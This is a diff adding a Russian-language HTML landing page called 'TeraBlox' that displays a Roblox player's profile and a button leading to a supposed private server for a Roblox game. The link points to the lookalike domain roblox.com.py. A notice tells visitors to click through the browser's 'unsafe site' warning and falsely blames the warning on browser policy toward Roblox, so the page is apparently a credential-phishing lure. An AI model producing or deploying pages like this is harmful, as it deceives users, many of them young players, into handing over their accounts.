@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>TeraBlox</title>
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+
+  <style>
+    :root{
+      --bg1:#f9f9fb;
+      --bg2:#e6e6ea;
+      --card:#fff;
+      --text:#111;
+      --muted:#6e6e73;
+      --muted-strong:#333;
+      --accent1:#007aff;
+      --accent2:#0066d6;
+      --accent3:#0052a8;
+      --surface:#f5f5f7;
+      --radius-xl:40px;
+      --radius-lg:25px;
+      --radius-md:20px;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",Roboto,system-ui,sans-serif;
+      background:linear-gradient(145deg,var(--bg1),var(--bg2));
+      display:flex;align-items:center;justify-content:center;
+      padding:24px;
+    }
+    .card{
+      background:var(--card);
+      border-radius:var(--radius-xl);
+      box-shadow:0 20px 40px rgba(0,0,0,.12);
+      padding:56px 40px 32px;
+      width:min(520px,94vw);
+      text-align:center;
+      animation:fadeIn .9s ease both;
+    }
+    .title{
+      font-size:clamp(32px,5.5vw,48px);
+      font-weight:800;
+      color:var(--text);
+      letter-spacing:-.02em;
+      margin:0 0 40px;
+    }
+    .btn{
+      display:inline-flex;align-items:center;justify-content:center;gap:12px;
+      background:linear-gradient(145deg,var(--accent1),var(--accent2));
+      color:#fff;text-decoration:none;
+      font-size:1.15rem;font-weight:650;
+      padding:15px 28px;border-radius:var(--radius-lg);
+      box-shadow:0 10px 25px rgba(0,122,255,.35);
+      transition:transform .25s ease, box-shadow .25s ease, filter .25s ease;
+    }
+    .btn:hover{ transform:translateY(-3px); box-shadow:0 14px 28px rgba(0,122,255,.45); filter:saturate(1.05) }
+    .btn:active{ transform:translateY(-1px) }
+    .btn i{ font-size:1.15rem }
+
+    /* Профиль */
+    .profile{
+      margin-top:28px;
+      display:flex;align-items:center;justify-content:center;gap:16px;
+      background:var(--surface);
+      border-radius:var(--radius-md);
+      padding:14px 18px;
+      box-shadow:inset 0 2px 6px rgba(0,0,0,.05);
+      min-height:84px;
+    }
+    .avatar{
+      width:64px;height:64px;border-radius:16px;overflow:hidden;flex:0 0 auto;
+      box-shadow:0 4px 10px rgba(0,0,0,.10); position:relative;
+      background:linear-gradient(120deg,#dfe3ee,#f1f3f7);
+    }
+    .avatar img{
+      width:100%;height:100%;object-fit:cover;display:block;opacity:0;transition:opacity .35s ease;
+    }
+    .avatar.loaded img{ opacity:1 }
+    .name-wrap{ text-align:left }
+    .nickname{
+      font-size:1.05rem;font-weight:700;color:var(--muted-strong);line-height:1.2;
+    }
+    .displayname{
+      font-size:.95rem;color:var(--muted);line-height:1.2;margin-top:4px;
+    }
+
+    /* Предупреждение */
+    .note{
+      margin-top:18px;
+      font-size:.95rem; line-height:1.6; color:var(--muted);
+      background:var(--surface);
+      border-radius:var(--radius-md);
+      padding:14px 16px;
+      box-shadow:inset 0 2px 6px rgba(0,0,0,.05);
+      text-align:left;
+    }
+    .note .row{ display:flex;align-items:flex-start;gap:10px }
+    .note .warn-icon{ color:#ff9500; font-size:1.1rem; margin-top:3px }
+
+    @keyframes fadeIn{ from{opacity:0;transform:translateY(18px)} to{opacity:1;transform:translateY(0)} }
+
+    /* Адаптив */
+    @media (max-width:420px){
+      .profile{ flex-direction:row; align-items:center }
+      .title{ margin-bottom:32px }
+    }
+  </style>
+</head>
+<body>
+  <main class="card" role="main">
+    <h1 class="title">TeraBlox</h1>
+
+    <a class="btn" href="https://roblox.com.py/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=71827346092494727264267569343200" target="_blank" rel="noopener">
+      <i class="fa-solid fa-arrow-right"></i>
+      Перейти
+    </a>
+
+    <!-- Профиль Roblox (аватар + ник + displayName) -->
+    <section class="profile" aria-live="polite" aria-busy="true">
+      <div class="avatar" id="rbxAvatar">
+        <!-- загрузка скелета -->
+      </div>
+      <div class="name-wrap">
+        <div class="nickname" id="rbxNickname">terablox_uf3DhE</div>
+        <div class="displayname" id="rbxDisplay">(загрузка профиля…)</div>
+      </div>
+    </section>
+
+    <!-- Подсказка -->
+    <aside class="note">
+      <div class="row">
+        <i class="fa-solid fa-triangle-exclamation warn-icon" aria-hidden="true"></i>
+        <div>
+          Если появилась страница <b>«Это небезопасный сайт»</b>, нажмите
+          <i>«Дополнительно»</i>, затем <i>«Перейти на небезопасный сайт (не рекомендуется)»</i>.<br>
+          Это ограничение связано с политиками браузеров в отношении Roblox.
+        </div>
+      </div>
+    </aside>
+  </main>
+
+  <script>
+    // === Настройки ===
+    const USERNAME = "terablox_uf3DhE";
+    const headshotSize = "150x150"; // варианты: 48x48, 150x150, 420x420, 720x720
+
+    // DOM ссылки
+    const elAvatar = document.getElementById("rbxAvatar");
+    const elNick = document.getElementById("rbxNickname");
+    const elDisplay = document.getElementById("rbxDisplay");
+
+    async function fetchRobloxProfile(username){
+      // 1) Получить userId по никнейму
+      const usersLookup = await fetch("https://users.roblox.com/v1/usernames/users", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
+      });
+      if(!usersLookup.ok) throw new Error("Не удалось получить userId");
+      const lookupData = await usersLookup.json();
+      const match = lookupData?.data?.[0];
+      if(!match?.id) throw new Error("Пользователь не найден");
+
+      const userId = match.id;
+
+      // 2) Получить displayName (и проверочную инфу)
+      const userInfoRes = await fetch(`https://users.roblox.com/v1/users/${userId}`);
+      if(!userInfoRes.ok) throw new Error("Не удалось получить информацию о пользователе");
+      const userInfo = await userInfoRes.json();
+      const displayName = userInfo.displayName || username;
+
+      // 3) Получить аватар (headshot)
+      const thumbRes = await fetch(
+        `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=${headshotSize}&format=Png&isCircular=false`
+      );
+      if(!thumbRes.ok) throw new Error("Не удалось получить аватар");
+      const thumbData = await thumbRes.json();
+      const avatarUrl = thumbData?.data?.[0]?.imageUrl;
+
+      return { userId, displayName, avatarUrl };
+    }
+
+    function setAvatar(url){
+      const img = new Image();
+      img.alt = "Аватар Roblox";
+      img.onload = () => {
+        elAvatar.classList.add("loaded");
+        elAvatar.innerHTML = "";
+        elAvatar.appendChild(img);
+      };
+      img.onerror = () => setAvatarFallback();
+      img.src = url;
+    }
+
+    function setAvatarFallback(){
+      // простая заглушка
+      elAvatar.classList.add("loaded");
+      elAvatar.innerHTML = `
+        <svg viewBox="0 0 64 64" width="64" height="64" aria-hidden="true">
+          <rect x="0" y="0" width="64" height="64" rx="16" fill="#e9ebf1"/>
+          <circle cx="32" cy="26" r="12" fill="#cfd5e3"/>
+          <rect x="12" y="40" width="40" height="16" rx="8" fill="#cfd5e3"/>
+        </svg>
+      `;
+    }
+
+    (async () => {
+      try{
+        const { displayName, avatarUrl } = await fetchRobloxProfile(USERNAME);
+        elNick.textContent = USERNAME;
+        elDisplay.textContent = displayName;
+        if(avatarUrl) setAvatar(avatarUrl); else setAvatarFallback();
+        document.querySelector(".profile").setAttribute("aria-busy","false");
+      }catch(err){
+        console.error(err);
+        elDisplay.textContent = "(Подойдите к этому игроку.)";
+        setAvatarFallback();
+        document.querySelector(".profile").setAttribute("aria-busy","false");
+      }
+    })();
+  </script>
+</body>
+</html>
